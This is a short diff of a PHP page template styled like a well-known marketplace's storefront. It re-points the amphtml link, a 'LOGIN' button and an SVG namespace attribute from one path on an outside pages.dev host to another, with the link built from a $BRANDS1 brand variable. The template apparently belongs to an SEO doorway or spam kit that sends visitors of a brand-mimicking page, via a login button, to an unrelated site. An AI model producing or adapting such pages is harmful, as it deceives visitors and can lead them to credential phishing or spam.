@@ -430,7 +430,7 @@
 
 
     <link rel="canonical" href="<?php echo $urlPath ?>" />
-    <link rel="amphtml" href="https://monitorr-ketua.pages.dev/kirugroup/?q=<?php echo $BRANDS1 ?>" />
+    <link rel="amphtml" href="https://monitorr-ketua.pages.dev/lexusacademic/?q=<?php echo $BRANDS1 ?>" />
     <link rel="alternate" href="<?php echo $urlPath ?>" hreflang="en" />
     <link rel="alternate" href="<?php echo $urlPath ?>" hreflang="en-FI" />
     <link rel="alternate" href="<?php echo $urlPath ?>" hreflang="en-AU" />
@@ -4317,13 +4317,13 @@
                                                                     class="wt-btn wt-btn--filled wt-width-full wt-no-wrap"
                                                                     type="submit">
                                                                     <a style="color: #fcfcfc;"
-                                                                        href="https://monitorr-ketua.pages.dev/kirugroup/">LOGIN</a>
+                                                                        href="https://monitorr-ketua.pages.dev/lexusacademic/">LOGIN</a>
 
                                                                     <div data-clg-id="WtSpinner"
                                                                         class="wt-spinner wt-spinner--01"
                                                                         aria-live="assertive" role="alert">
                                                                         <span class="wt-icon"><svg
-                                                                                xmlns="https://monitorr-ketua.pages.dev/kirugroup/"
+                                                                                xmlns="https://monitorr-ketua.pages.dev/lexusacademic/"
                                                                                 viewBox="0 0 24 24" aria-hidden="true"
                                                                                 focusable="false">
                                                                                 <circle fill="transparent" cx="12"
